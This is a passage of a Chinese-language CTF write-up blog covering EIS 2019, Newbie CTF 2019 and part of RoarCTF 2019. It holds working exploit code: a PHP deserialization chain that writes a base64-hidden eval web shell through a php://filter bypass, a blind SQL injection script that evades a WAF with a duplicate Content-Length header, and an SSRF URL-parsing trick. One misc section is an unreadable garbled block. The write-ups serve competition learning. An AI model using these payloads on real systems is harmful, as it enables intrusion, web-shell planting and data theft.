class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir(<span class="variable">$dir</span>))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>



<p>这里有一个上传点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line"><span class="variable">$result</span> = file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>

<p>但是这里有个死亡exit</p>
<p> <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p>
<p>这里文件名可控,我们用php协议编码exit从而绕过死亡exit</p>
<p>构造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$autosave</span>=<span class="literal">FALSE</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$complete</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key    = <span class="string">&quot;fffffuck.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store=<span class="keyword">new</span> B;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = <span class="variable">$expire</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;complete=<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbImEiXSk7ID8+&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache=<span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$options</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$writeTimes</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options=<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;expire&#x27;</span>=&gt;<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;prefix&quot;</span>=&gt;<span class="string">&#x27;php://filter/write=convert.base64-decode/resource=uploads/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;serialize&#x27;</span>=&gt;<span class="string">&#x27;serialize&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data_compress&#x27;</span>=&gt;<span class="literal">FALSE</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span>(urlencode(serialize(<span class="keyword">new</span> A)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h3><p> <a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits">https://github.com/mm0r1/exploits</a> </p>
<p>利用这个绕过</p>
<h3 id="ezwaf"><a href="#ezwaf" class="headerlink" title="ezwaf"></a>ezwaf</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params"><span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="variable">$newarr</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$val</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$newarr</span>[<span class="variable">$key</span>] = mysqli_real_escape_string(<span class="variable">$mysqli</span>, <span class="variable">$val</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$newarr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>= escape(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    mysqli_query(<span class="variable">$mysqli</span>, <span class="string">&quot;select age from user where name=&#x27;<span class="subst">$name</span>&#x27;&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$age</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    mysqli_query(<span class="variable">$mysqli</span>, <span class="string">&quot;select name from user where age=<span class="subst">$age</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>选择age作为注入点，不需要逃逸引号,没有回显利用时间盲注</p>
<p><code>?age=1%2bsleep(1)</code> =&gt; 403</p>
<p>apache设置了waf</p>
<p>用畸形的http绕过waf</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hackhttp </span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;111.186.57.61&#x27;</span></span><br><span class="line">port = <span class="number">10601</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_raw</span>(<span class="params">raw</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> socket.create_connection((ip, port), timeout=<span class="number">2</span>) <span class="keyword">as</span> conn:</span><br><span class="line">            conn.send(<span class="built_in">bytes</span>(raw,encoding=<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">            res = conn.recv(<span class="number">10240</span>).decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rawhttp</span>(<span class="params">sql</span>):</span></span><br><span class="line">    sql=urllib.parse.quote(sql)</span><br><span class="line">    burp0_url = <span class="string">&quot;http://111.186.57.61:10601/?age=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">    raw=<span class="string">&#x27;&#x27;&#x27;GET /?age=&#123;&#125; HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 111.186.57.61:10601</span></span><br><span class="line"><span class="string">Pragma: no-cache</span></span><br><span class="line"><span class="string">Cache-Control: no-cache</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Length: 0</span></span><br><span class="line"><span class="string">Content-Length: 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql).replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> send_raw(raw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l=<span class="string">&#x27;0123456789ABCDEF&#x27;</span></span><br><span class="line">result=<span class="string">&quot;657A73716C69&quot;</span><span class="comment">#database :ezsqli</span></span><br><span class="line"></span><br><span class="line">result=<span class="string">&quot;&quot;</span><span class="comment">#table flag_xdd,user?</span></span><br><span class="line"><span class="comment">#column flag_32122</span></span><br><span class="line"><span class="comment">#flag&#123;bypass_modsecurity_a202e614489c&#125;</span></span><br><span class="line">j=<span class="built_in">len</span>(result)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        sql=<span class="string">&quot;if((select substr(hex(GROUP_CONCAT(flag_32122)),&#123;&#125;,1) FROM flag_xdd)=char(&#123;&#125;),sleep(10),0)&quot;</span>.<span class="built_in">format</span>(j+<span class="number">1</span>,<span class="built_in">ord</span>(i))</span><br><span class="line">        <span class="keyword">if</span> rawhttp(sql):</span><br><span class="line">            result+=i</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;第&#123;&#125;个字符不是&#123;&#125;&quot;</span>.<span class="built_in">format</span>(j+<span class="number">1</span>,i))</span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p>莫得</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="two-cat"><a href="#two-cat" class="headerlink" title="two_cat"></a>two_cat</h3><p>看别人的wp知道是盲水印攻击</p>
<h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc 1"></a>misc 1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I¤Ìçz6j|´±¥ó¼¹[ƂĄʃz@ałޢ|ӄɒak@ałޢŅyĉӡk@ałޒ|ӄɒak@֋@JBťɁÉ֕k@ŧÅՄń@Ձ٨@ÖąŀąÉԁԀɕÅكȁՇƀÖąZ@U@SӅǅŀÈYCÅڀĀĢń@֕@ʂՀĉՖęË@ɣ@ŧɢâ@ɕ@c@ӅbĀȀԤäSӨ@ɕÖԗcɂӅ@Ņ٢ɖբk@SԀƅcęɕȀ¤È@ąӉǈâ@b@Ֆ֠ÖգɇĖĢ@Ӆãř@ؤŕÅÀUŀÈƀBՃƀֆ@ŅفԀ¢ĉʀפՃäcɖրÈYCÅ٢@ƁəӨ@ɔז٣UĀƖڀԖąٕ@Öԗģř@ӁՇāǅÀMŧCÓɀƈɃɀÈYCÅ٢@YƀBգ@ŁىŢ@CÖلɕȀÖ@ƈɃɀŅ٢ɖրֆ@ƂĄʃ@ȖŽم@Ӗ֒ɕȀc]K@ʂՀDWÅŀƂĄʃ@ƙ֔@פՃȅŀÁل@Öą@ɕ@ÈƀŁٓɀ񹶰ÀUŀי֔ēǁÅŀɣ@b@ä£֔ř`ÖգٖԀÁãɃ@MƀÖՕŃÖڀÖբ׉فè]k@ęՉՇ@ÈƀSمDɀŢÁɢȅŀ¢ĉʀ£UāلK@㖄hk@ʂՀÓIԢ@Ö@@U@֗ŕ`¨£ŔÀÖԗUɫ@¤ĀʂսÀ֦րąىףɖրֆ@ÈƀƂĄʃ@ŁىUâ@UŀȖǀÖ@ÖեřĀæŅրÈŔ@ɢ@£ɓԀɕÅٕSӨ@ÓbƉń@ÖؠÙţk@¤ٕ`Ɩم`مDɕȋ@ȁÒřÀUÈ@c@ÈƀŅ٨@Ձԅ@ֆ@ƂĄʃ@UŀÖբɄř@ɣ@ԁՉƅ£cɖրֆ@פم£@ťɓKƓG@ɢ@ƓGp°��ƴ����򴄴𰲳ǰƄÅ�</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/04/19/eis2019/" data-id="ckw63s4lq004iflolfw262wcf" data-title="eis2019" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-nbctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/19/nbctf/" class="article-date">
  <time class="dt-published" datetime="2020-04-19T16:00:00.000Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/19/nbctf/">newbie ctf 2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="newbie-ctf-2019"><a href="#newbie-ctf-2019" class="headerlink" title="newbie ctf 2019"></a>newbie ctf 2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="normal-host"><a href="#normal-host" class="headerlink" title="normal_host"></a>normal_host</h3><p>题目描述:</p>
<blockquote>
<p>You can get flag in “normalflag.iwinv.net”</p>
</blockquote>
<p>题目给的链接</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kogjizorj30ue0gvngf.jpg" alt="image.png"></p>
<p>直接访问 flag</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kofgp0d7j312909paar.jpg" alt="image.png"></p>
<p>输入网站测试发现,会在网址后面加个secret参数</p>
<p><img src="C:\Users\蔡建斌\AppData\Roaming\Typora\typora-user-images\image-20191103111420354.png" alt="image-20191103111420354"></p>
<p>而flag界面就是通过这个secret来识别是否通过internal.iwinv.net</p>
<p>观察secret发现，每次访问给出的secret都不一样</p>
<p>排除掉算出secret的做法,那么接下来就是要绕过禁用host的限制或者是输入一个网址，让其无法识别出是<code>normalflag.iwinv.net</code>却能访问<code>normalflag.iwinv.net</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kolppcsfj30g3045748.jpg" alt="image.png"></p>
<p>这就很容易想到php里面libcurl和parase的差异</p>
<blockquote>
<p>parse_url与libcurl对与url的解析差异可能导致ssrf当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对<a target="_blank" rel="noopener" href="http://user%40eval.com:80@baidu.com进行解析时,php获取的host是baidu.com是允许访问的域名,而最后调用libcurl进行请求时则是请求的eval.com域名,可以造成ssrf绕过此外对于https//evil@baidu.com%E8%BF%99%E6%A0%B7%E7%9A%84%E5%9F%9F%E5%90%8D%E8%BF%9B%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%97%B6,php%E8%8E%B7%E5%8F%96%E7%9A%84host%E6%98%AFevil@baidu.com%EF%BC%8C%E4%BD%86%E6%98%AFlibcurl%E8%8E%B7%E5%8F%96%E7%9A%84host%E5%8D%B4%E6%98%AFevil.com">http://user@eval.com:80@baidu.com进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过此外对于https://evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com</a> </p>
<p>from  <a target="_blank" rel="noopener" href="https://paper.seebug.org/561">https://paper.seebug.org/561</a> </p>
</blockquote>
<p>构造url:<code>user@4399.com@normalflag.iwinv.net</code>(我是来帮4399打广告的:v:)​</p>
<p>KorNewbie{H0$7_$P1it_A774cK_U$3s_N0RM^liZ47ioN&amp;##$%%!}</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="catch-me"><a href="#catch-me" class="headerlink" title="catch me"></a>catch me</h3><p>利用工具逐帧查看，把每个子出现的位置记录转成ascii码得到flag</p>
<p>KorNewbie{w0w_e4g1e_3y3}</p>
<h3 id="BiMilCode"><a href="#BiMilCode" class="headerlink" title="BiMilCode"></a>BiMilCode</h3><p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8kovw3cl4j30e704pt8u.jpg" alt="image.png"></p>
<p>刚开始题目说要encode。结果被这个误解搞了一个小时才发现是decode</p>
<p>观察发现一个字符会被编码成2位的16进制的数据</p>
<p>认真观察发现编码方式还和位置有关，但是相同的位置编码方式相同,而且只是对ascii码进行移位</p>
<p>也就是说,在同一个会话里,我们可以通过ascii码的差值来得到来计算出题目给出的编码后的字符串</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kp8m10vej30ep058jrl.jpg" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s2=<span class="string">&#x27;45 dd 97 38 62 6c 62 85&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">s1=<span class="string">&#x27;3a 93 78 3a 6c 63 3a 63&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"><span class="built_in">print</span>(s2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s1)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)+<span class="built_in">int</span>(s1[i],<span class="number">16</span>)-<span class="built_in">int</span>(s2[i],<span class="number">16</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>





<p>KorNewbie{Nace_I_believed_it}</p>
<h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="find-the-plain"><a href="#find-the-plain" class="headerlink" title="find the plain"></a>find the plain</h3><p>题目描述</p>
<blockquote>
<p>Alpha team’s whistleblower captured a packet that leaked internal information to the outside using ftp internal confidential data.</p>
<p>Analyze the packet and flag the password and information obtained for the ftp connection!</p>
<p>flag format : KorNewbie{password_yougetinformation}</p>
<p>※ If there is a hash value, it will be md5.</p>
</blockquote>
<p>用<code>(!frame.len== 1518) &amp;&amp;(!frame.len== 1514)&amp;&amp; (! ip.addr==192.229.232.240) &amp;&amp; (not tcp.stream==2) &amp;&amp; (not tcp.stream==0)&amp;&amp; (not tcp.stream==1)</code></p>
<p>过滤找到ftp传输文件和账号密码</p>
<p>password:root</p>
<p>badguy.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7J2067O06rKMIOyVjO2MjO2MgOydmCDsi6Dsg4HsoJXrs7TripQg67CR7J2YIOyjvOyGjOyXkCDrqqjrkZAg64u07JWE64aT7JWY64SkLiDqsbTtiKzrpbwg67mM7KeA7JuM7YSwLi4gDQpodHRwczovL3Bhc3RlYmluLmNvbS83MHlER2lSUw==</span><br></pre></td></tr></table></figure>





<p>decode得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">이보게 알파팀의 신상정보는 밑의 주소에 모두 담아놓았네. 건투를 빌지워터.. </span><br><span class="line">//alpha组的个人信息全部放在下面的地址里。祝你成功..</span><br><span class="line">https://pastebin.com/70yDGiRS</span><br></pre></td></tr></table></figure>

<p><code>k459iki6m5j094m2lmkhjmi9527l81ml</code></p>
<p>题目提示得到的一个信息是md5</p>
<p>所以对这个进行凯撒密码解密得到<code>d459bdb6f5c094f2efdacfb9527e81fe</code></p>
<p>后面发现<img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k0vd6qapj30ue015gli.jpg" alt="image.png"></p>
<p>这里也提示了凯撒加密</p>
<p>但是用国内的md5解密网站无论如何也破不了</p>
<p>用朝鲜语搜了一下就解密了</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8k0ww99j0j30j6036t8w.jpg" alt="image.png"></p>
<p>KorNewbie{root_IronDragon}</p>
<p>………………………</p>
<p>这是个梗吗.</p>
<h3 id="chat"><a href="#chat" class="headerlink" title="chat"></a>chat</h3><p>题目描述</p>
<blockquote>
<p>Confidential information came and went through chat. Find the email of the user who used the chat. </p>
</blockquote>
<p>user:NewbieCTF2019</p>
<p>在youtube找到一个好玩的重置密码的方法</p>
<p> <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=YBFAzK9mgNI">https://www.youtube.com/watch?v=YBFAzK9mgNI</a> </p>
<p>根据这个来重置密码</p>
<p>重置密码后看着棒子文我是懵逼的(同伴+1)</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kph085tzj31gw0see6k.jpg" alt="image.png"></p>
<p>根据题目提示聊天软件理所当然的盯上了kakao</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kppnap1sj30wj0b60u7.jpg" alt="image.png"></p>
<p>跑到文件夹里翻一翻(也可以写个脚本/fad)</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8kpqxb2njj30tz0j8my5.jpg" alt="image.png"></p>
<p>最后拿到flag</p>
<p><code>KorNewbie&#123;renek@it-simple.net&#125;</code></p>
<h3 id="rec"><a href="#rec" class="headerlink" title="rec"></a>rec</h3><p>这题跟进去调试也没看到啥，想来想去防止取证题的地方怎么也不可能是逆向啥的、</p>
<p>于是就开始用binwalk,strings…..</p>
<p>最后翻一翻找到了seg段…………</p>
<p>在seg段找到</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9aly1g8k2xe25wlj30io0gbdio.jpg" alt="image.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/04/19/nbctf/" data-id="ckw63s4m5005dflol3srm4sau" data-title="newbie ctf 2019" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-roarctf2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/19/roarctf2019/" class="article-date">
  <time class="dt-published" datetime="2020-04-19T16:00:00.000Z" itemprop="datePublished">2020-04-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/19/roarctf2019/">roarctf2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="roarctf2019"><a href="#roarctf2019" class="headerlink" title="roarctf2019"></a>roarctf2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easycalc"><a href="#easycalc" class="headerlink" title="easycalc"></a>easycalc</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span 